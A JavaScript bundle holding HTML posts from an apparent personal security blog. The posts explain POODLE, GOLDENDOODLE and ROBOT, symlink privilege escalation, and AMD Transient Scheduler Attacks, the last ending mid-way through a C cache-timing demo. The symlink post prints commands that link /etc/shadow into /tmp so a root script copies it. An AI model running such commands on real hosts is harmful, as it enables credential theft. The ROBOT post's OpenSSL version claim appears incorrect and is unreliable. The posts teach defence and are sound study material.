          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Bm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Um=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Hm=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

